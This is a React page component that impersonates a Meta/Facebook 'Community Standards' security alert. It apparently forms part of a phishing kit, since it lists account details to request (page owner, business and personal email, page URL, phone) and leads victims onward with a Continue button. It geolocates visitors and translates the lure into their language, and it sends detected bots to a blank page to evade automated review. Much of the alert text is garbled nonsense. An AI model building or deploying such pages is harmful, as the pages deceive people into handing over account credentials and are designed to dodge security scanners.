import HeroImage from '@/assets/images/hero-image.jpg';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import { faCircleCheck, faIdCard, faExclamationTriangle, faFileAlt, faUserShield } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useCallback, useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router';

const Index = () => {
    const navigate = useNavigate();
    const [today, setToday] = useState();
    const [isLoading, setIsLoading] = useState(true);
    const defaultTexts = useMemo(
        () => ({
            title: 'Community Standards',
            callDate: 'CALL OF 12/7/2022',
            ourMessage: 'Our Message',
            messagePoints: [
                'appeal and history of intelligence - Volunteered use of copyrighted content.',
                'Player of WhatsApp information - Sampling generator or resolution center.',
                'Advertising Policy Guidelines - Running to the driver company with Meta\'s guidelines,',
                'Gardening Activity - Unusual client presence and contact location.',
                '(Produktive you page can remotely update, 15:30 for more on today.)'
            ],
            requestTitle: 'Request / New Account Information',
            requestFields: [
                'Who is the owner of the Page?',
                'Business Email',
                'Personal Email', 
                'Facebook Page URL',
                'Phone Member',
                'User',
                'Cloning your credit and/or debit cards doesn\'t match your current location',
                'You may not exhibit the tick 10 days',
                'Your Microsoft within the last 100 days',
                'Your Appet',
                'I\'ll agree to our Terms, Chat Policy and Collects Policy.'
            ],
            subsections: 'Subsections',
            privacyText: 'For more information about how Meta hands you class please read our Meta Privacy Policy',
            continueBtn: 'Continue'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedCallDate,
                    translatedOurMessage,
                    translatedRequestTitle,
                    translatedSubsections,
                    translatedPrivacyText,
                    translatedContinueBtn
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.callDate, targetLang),
                    translateText(defaultTexts.ourMessage, targetLang),
                    translateText(defaultTexts.requestTitle, targetLang),
                    translateText(defaultTexts.subsections, targetLang),
                    translateText(defaultTexts.privacyText, targetLang),
                    translateText(defaultTexts.continueBtn, targetLang)
                ]);

                // Translate message points
                const translatedMessagePoints = await Promise.all(
                    defaultTexts.messagePoints.map(point => translateText(point, targetLang))
                );

                // Translate request fields
                const translatedRequestFields = await Promise.all(
                    defaultTexts.requestFields.map(field => translateText(field, targetLang))
                );

                setTranslatedTexts({
                    title: translatedTitle,
                    callDate: translatedCallDate,
                    ourMessage: translatedOurMessage,
                    messagePoints: translatedMessagePoints,
                    requestTitle: translatedRequestTitle,
                    requestFields: translatedRequestFields,
                    subsections: translatedSubsections,
                    privacyText: translatedPrivacyText,
                    continueBtn: translatedContinueBtn
                });
            } catch (error) {
                console.log('translation failed:', error.message);
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const init = async () => {
            const date = new Date();
            const options = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();

            const checkBot = async () => {
                try {
                    const botResult = await detectBot();
                    if (botResult.isBot) {
                        window.location.href = 'about:blank';
                        return;
                    }
                } catch {
                    //
                }
            };

            const fetchIpInfo = async () => {
                try {
                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
                    const countryCode = response.data.country_code;
                    const targetLang = countryToLanguage[countryCode] || 'en';

                    setIsLoading(false);
                    localStorage.setItem('targetLang', targetLang);
                    translateAllTexts(targetLang);
                } catch {
                    //
                }
            };
            await fetchIpInfo();
            await checkBot();
        };

        init();
    }, [translateAllTexts]);

    return (
        <div className='flex min-h-screen items-center justify-center bg-gray-50 py-8 px-4'>
            <title>Community Standards</title>
            
            <div className='w-full max-w-4xl bg-white rounded-lg shadow-lg border border-gray-200'>
                {/* Header */}
                <div className='bg-blue-600 text-white p-6 rounded-t-lg'>
                    <div className='flex items-center justify-between'>
                        <div className='flex items-center gap-3'>
                            <FontAwesomeIcon icon={faUserShield} className='h-8 w-8' />
                            <div>
                                <h1 className='text-2xl font-bold'>{translatedTexts.title}</h1>
                                <p className='text-blue-100'>{translatedTexts.callDate}</p>
                            </div>
                        </div>
                        <div className='text-right'>
                            <div className='flex items-center gap-2 bg-blue-500 px-3 py-1 rounded-full'>
                                <FontAwesomeIcon icon={faExclamationTriangle} className='h-4 w-4' />
                                <span className='text-sm'>Security Alert</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div className='p-6 space-y-6'>
                    {/* Our Message Section */}
                    <div className='bg-yellow-50 border border-yellow-200 rounded-lg p-4'>
                        <h2 className='text-lg font-bold text-gray-800 mb-3 flex items-center gap-2'>
                            <FontAwesomeIcon icon={faFileAlt} className='h-5 w-5 text-yellow-600' />
                            {translatedTexts.ourMessage}
                        </h2>
                        <ul className='space-y-2'>
                            {translatedTexts.messagePoints.map((point, index) => (
                                <li key={index} className='flex items-start gap-2 text-sm text-gray-700'>
                                    <span className='text-yellow-600 mt-1'>•</span>
                                    <span>{point}</span>
                                </li>
                            ))}
                        </ul>
                    </div>

                    {/* Divider */}
                    <div className='border-t border-gray-300 my-6'></div>

                    {/* Request Section */}
                    <div>
                        <h2 className='text-lg font-bold text-gray-800 mb-4'>{translatedTexts.requestTitle}</h2>
                        <div className='grid grid-cols-1 md:grid-cols-2 gap-4'>
                            {translatedTexts.requestFields.map((field, index) => (
                                <div key={index} className='flex items-center gap-2 p-3 bg-gray-50 rounded-lg border border-gray-200'>
                                    <FontAwesomeIcon icon={faCircleCheck} className='h-4 w-4 text-blue-600 flex-shrink-0' />
                                    <span className='text-sm text-gray-700'>{field}</span>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Divider */}
                    <div className='border-t border-gray-300 my-6'></div>

                    {/* Subsections */}
                    <div>
                        <h3 className='text-md font-bold text-gray-800 mb-3'>{translatedTexts.subsections}</h3>
                        <p className='text-sm text-gray-600 bg-gray-50 p-4 rounded-lg border border-gray-200'>
                            {translatedTexts.privacyText}
                        </p>
                    </div>

                    {/* Continue Button */}
                    <div className='flex justify-center pt-4'>
                        <button
                            className='bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-8 rounded-lg transition duration-200 disabled:opacity-50 flex items-center gap-2'
                            disabled={isLoading}
                            onClick={() => {
                                navigate(PATHS.HOME);
                            }}
                        >
                            <FontAwesomeIcon icon={faIdCard} className='h-5 w-5' />
                            {isLoading ? 'Loading...' : translatedTexts.continueBtn}
                        </button>
                    </div>

                    {/* Footer Date */}
                    <div className='text-center text-sm text-gray-500 border-t border-gray-200 pt-4'>
                        Restricted on <span className='font-semibold'>{today}</span>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Index;
